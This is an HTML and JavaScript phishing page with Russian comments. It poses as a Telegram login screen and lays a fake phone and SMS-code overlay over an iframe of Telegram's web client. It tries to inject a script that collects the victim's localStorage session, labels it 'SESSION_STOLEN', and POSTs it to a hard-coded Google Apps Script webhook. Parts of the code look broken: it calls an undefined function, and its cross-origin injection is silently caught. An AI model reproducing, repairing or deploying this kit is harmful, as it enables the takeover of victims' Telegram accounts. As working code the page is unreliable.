<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body {
            margin: 0;
            background: #0e1621;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }
        
        /* Твой визуальный интерфейс */
        .overlay-ui {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 320px;
            z-index: 100;
            background: #1c242f;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
        }
        
        .overlay-ui h3 { margin: 0 0 10px; }
        .overlay-ui p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        
        .input-wrapper {
            position: relative;
            margin: 10px 0;
            height: 45px; /* Высота поля ввода */
        }
        
        /* Прозрачный инпут, который будет кликать по реальному инпуту в iframe */
        .fake-input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 101;
            cursor: text;
        }
        
        /* Визуальная обводка инпута */
        .visual-input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 1px solid #333;
            border-radius: 8px;
            background: #0e1621;
            color: white;
            font-size: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none; /* Чтобы клики проходили сквозь визуализацию */
        }

        button {
            background: #3390ec;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
        }
        button:disabled { background: #555; }

        /* Iframe, который лежит под UI */
        #tg-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: white;
            z-index: 1;
            opacity: 0.95; /* Почти непрозрачный, но можно и 0 */
            /* Важно: через transform создаем пространство для кликов */
            transform-origin: center center;
        }

        /* Маска, чтобы клики шли в iframe только там, где нужно */
        .click-mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 50;
            pointer-events: none; /* По умолчанию клики идут сквозь маску */
        }
        
        /* Зона, где клики должны идти в iframe (когда он открыт) */
        .click-zone {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 320px;
            height: 200px; /* Примерная область инпутов */
            pointer-events: auto;
            background: transparent;
        }

        #status { margin-top: 15px; font-size: 13px; color: #aaa; }
    </style>
</head>
<body>

<!-- Твой визуальный UI -->
<div class="overlay-ui" id="login-box">
    <h3>Telegram</h3>
    <p>Введите номер телефона</p>
    
    <div class="input-wrapper">
        <div class="visual-input" id="visual-phone">+79991234567</div>
        <input type="text" class="fake-input" id="fake-phone" onfocus="focusIframeInput('phone')">
    </div>

    <div class="input-wrapper" id="code-wrapper" style="display:none;">
        <div class="visual-input" id="visual-code">12345</div>
        <input type="text" class="fake-input" id="fake-code" onfocus="focusIframeInput('code')">
    </div>

    <button id="sendBtn" onclick="startLogin()">Далее</button>
    <div id="status"></div>
</div>

<!-- Iframe -->
<iframe id="tg-frame"></iframe>

<script>
    // Вставь свой Google Apps Script URL сюда
    const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwnhGW5PG_UYj3eDcX1RGPj4oAAhPwi59qLil9CCCc-ts497xszc1T1ljK1vUDPTCcO/exec';

    const iframe = document.getElementById('tg-frame');
    const loginBox = document.getElementById('login-box');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');
    const fakePhone = document.getElementById('fake-phone');
    const fakeCode = document.getElementById('fake-code');
    const codeWrapper = document.getElementById('code-wrapper');
    const visualPhone = document.getElementById('visual-phone');
    const visualCode = document.getElementById('visual-code');

    let iframeReady = false;

    // Функция фокусировки на реальном инпуте в iframe
    function focusIframeInput(type) {
        if (!iframeReady) return;
        
        // Отправляем сообщение iframe, чтобы он сфокусировал нужный инпут
        iframe.contentWindow.postMessage({
            type: 'FOCUS',
            field: type // 'phone' или 'code'
        }, '*');
        
        // Визуальный эффект: скрываем свой инпут, чтобы было видно, что вводит iframe
        if (type === 'phone') {
            visualPhone.style.display = 'none';
            fakePhone.style.display = 'none';
        } else {
            visualCode.style.display = 'none';
            fakeCode.style.display = 'none';
        }
    }

    window.addEventListener('message', (event) => {
        if (event.data === 'IFRAME_READY') {
            iframeReady = true;
            // Инжектируем слушатель сессии
            injectSessionListener();
        }
        
        if (event.data.type === 'SESSION_STOLEN') {
            status.innerText = 'Сессия захвачена!';
            console.log('Session data:', event.data.session);
            // Можно отправить на свой сервер
            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: JSON.stringify(event.data.session)
            });
        }
    });

    function startLogin() {
        const phone = fakePhone.value;
        if (!phone) return;

        sendBtn.disabled = true;
        status.innerText = 'Загрузка...';

        // Открываем iframe с авторизацией
        iframe.src = `https://web.telegram.org/a/auth?phone_number=${encodeURIComponent(phone)}`;
        
        // Ждем загрузки iframe
        iframe.onload = () => {
            status.innerText = 'Введите код из SMS';
            // Показываем поле для кода
            codeWrapper.style.display = 'block';
            
            // Инжектим скрипт
            injectHoneypot();
        };
    }

    function injectHoneypot() {
        const script = document.createElement('script');
        script.textContent = `
            (function() {
                // Слушаем события фокуса от родителя
                window.addEventListener('message', (e) => {
                    if (e.data.type === 'FOCUS') {
                        // Пытаемся найти инпуты в iframe
                        const inputs = document.querySelectorAll('input');
                        inputs.forEach(input => {
                            if (e.data.field === 'phone' && input.type === 'tel') {
                                input.focus();
                            }
                            if (e.data.field === 'code' && input.type === 'text') {
                                input.focus();
                            }
                        });
                    }
                });

                // Собираем сессию
                function sendSession() {
                    const ls = {};
                    for(let i=0; i<localStorage.length; i++) {
                        const key = localStorage.key(i);
                        ls[key] = localStorage.getItem(key);
                    }
                    
                    window.parent.postMessage({
                        type: 'SESSION_STOLEN',
                        session: { localStorage: ls, timestamp: Date.now() }
                    }, '*');
                }

                // Слушаем изменения
                window.addEventListener('storage', (e) => {
                    if (e.key && e.key.includes('session')) {
                        sendSession();
                    }
                });

                // Периодическая проверка
                setInterval(() => {
                    if (localStorage.getItem('tg_session')) {
                        sendSession();
                    }
                }, 2000);

                window.parent.postMessage('IFRAME_READY', '*');
            })();
        `;
        setTimeout(() => {
            try {
                iframe.contentDocument.body.appendChild(script);
            } catch (e) {}
        }, 1000);
    }
</script>

</body>
</html>
